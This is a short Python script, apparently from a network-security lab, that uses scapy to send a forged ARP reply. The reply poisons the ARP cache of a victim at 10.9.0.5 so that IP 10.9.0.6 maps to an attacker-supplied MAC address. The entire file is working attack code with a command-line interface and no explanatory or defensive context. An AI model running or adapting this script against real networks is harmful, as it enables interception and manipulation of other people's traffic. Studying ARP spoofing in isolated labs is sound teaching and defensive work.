"""ARP spoofing."""
import argparse

import scapy.all as sc
from scapy.layers import l2


def main(attacker_mac: str) -> None:
    """ARP Spoofing."""
    a = l2.ARP()
    a.op = 'is-at'

    # Victim
    a.pdst = '10.9.0.5'
    a.hwdst = '02:42:0a:09:00:05'

    # Attacker MAC and Spoofed IP
    a.psrc = '10.9.0.6'
    a.hwsrc = attacker_mac

    a.show()

    sc.send(a)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ARP Spoofing')

    parser.add_argument('-a',
                        '--attacker_mac',
                        type=str,
                        required=True,
                        help='Attacker MAC Address')

    args = parser.parse_args()

    main(args.attacker_mac)
